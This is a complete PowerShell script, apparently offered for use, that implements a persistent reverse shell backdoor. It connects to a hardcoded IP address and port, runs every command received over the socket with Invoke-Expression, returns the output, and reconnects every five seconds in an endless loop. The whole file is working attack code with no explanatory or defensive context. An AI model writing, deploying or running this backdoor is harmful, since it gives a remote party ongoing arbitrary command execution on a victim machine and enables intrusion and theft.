function Invoke-ReverseShellBackdoor {
    param (
        [string]$ipAddress,
        [int]$port
    )

    while ($true) {
        try {
            $client = New-Object System.Net.Sockets.TcpClient($ipAddress, $port)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            
            $writer.WriteLine("Connected to reverse shell backdoor.")
            $writer.Flush()

            while ($true) {
                $command = $reader.ReadLine()
                if ($command -eq $null) { break }

                $output = (Invoke-Expression $command 2>&1)
                $writer.WriteLine($output)
                $writer.Flush()
            }
        }
        catch {
            Write-Error "Error occurred: $_"
        }
        finally {
            if ($reader -ne $null) { $reader.Close() }
            if ($writer -ne $null) { $writer.Close() }
            if ($stream -ne $null) { $stream.Close() }
            if ($client -ne $null) { $client.Close() }
        }

        # Wait for a moment before reconnecting
        Start-Sleep -Seconds 5
    }
}

Invoke-ReverseShellBackdoor "192.168.0.177" 5939
